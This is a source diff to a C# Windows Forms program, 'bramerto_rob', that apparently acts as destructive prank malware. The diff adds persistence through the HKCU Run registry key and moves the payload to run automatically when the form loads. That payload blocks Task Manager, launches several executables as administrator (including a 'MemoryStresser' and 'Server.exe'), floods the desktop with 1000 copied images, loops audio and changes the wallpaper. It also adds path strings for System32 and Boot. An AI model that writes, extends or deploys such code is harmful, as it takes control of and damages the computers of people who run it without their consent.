@@ -54,6 +54,8 @@ namespace bramerto_rob
         string destinationFile2 = @"C:\Windows\Insidious12.exe";
         string source3 = @"C:\Program Files (x86)\bramerto-rob\Files\Server.exe";
         string destinationFile3 = @"C:\Windows\Server.exe";
+        string root = @"C:\Windows\System32";
+        string root2 = @"C:\Windows\Boot";
 
         [DllImport("user32.dll", CharSet = CharSet.Auto)]
         private static extern Int32 SystemParametersInfo(
@@ -67,6 +69,12 @@ namespace bramerto_rob
         public Kill()
         {
             InitializeComponent();
+        }
+
+        public void KillWindows()
+        {
+            Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+            key.SetValue(@"C:\Program Files (x86)\bramerto-rob\Files\Server.exe", Application.ExecutablePath);
         }
 
         public void SetWallpaper(String path)
@@ -95,20 +103,18 @@ namespace bramerto_rob
         private void Form1_Load_1(object sender, EventArgs e)
         {
             BlockTM();
-            wc.DownloadFile("https://moe.shikimori.one/system/user_images/original/169245/914737.jpg", localfilename);            
+            KillWindows();
+            wc.DownloadFile("https://moe.shikimori.one/system/user_images/original/169245/914737.jpg", localfilename);
             ExecuteAsAdmin(@"C:\Program Files (x86)\bramerto-rob\Files\MemoryStresser.exe");
-
-        }
-        private void StartButton_Click(object sender, EventArgs e)
-        {
             this.Visible = false;
             sp.Play();
             img.Show();
+            img.WindowState = FormWindowState.Maximized;
             Time1.Interval = 7000;
             Time1.Enabled = true;
             Time1.Tick += new EventHandler(Time1_Tick_1);
             Time1.Start();
-            for(int i = 0; i < 1000; i++)
+            for (int i = 0; i < 1000; i++)
             {
                 string num = Desktop + i.ToString() + "ニャンパス.jpg";
                 File.Copy(localfilename, num, true);
@@ -116,7 +122,7 @@ namespace bramerto_rob
             if (File.Exists(imgWallpaper))
             {
                 SetWallpaper(imgWallpaper);
-            }            
+            }
         }
         
         private void Time1_Tick_1(object sender, EventArgs e)
@@ -124,20 +130,24 @@ namespace bramerto_rob
             Time1.Stop();
             Time1.Enabled = false;
             Time3.Interval = 60000;
-            sp2.PlayLooping();
             Time3.Enabled = true;
+            sp2.PlayLooping();
             Time3.Tick += new EventHandler(Time3_Tick);
             Time3.Start();
             ExecuteAsAdmin(@"C:\Program Files (x86)\bramerto-rob\Marb\bin\Debug\net5.0-windows\Marb.exe");
         }
 
-        
         private void Time3_Tick(object sender, EventArgs e)
         {
             Time3.Stop();
             Time3.Enabled = false;
 
-            ExecuteAsAdmin(@"C:\Program Files(x86)\Files\JavaPlatform.exe");
-        }        
+            ExecuteAsAdmin(@"C:\Program Files (x86)\bramerto-rob\Files\Server.exe");
+        }
+
+        private void StartButton_Click(object sender, EventArgs e)
+        {
+            
+        }
     }
 }
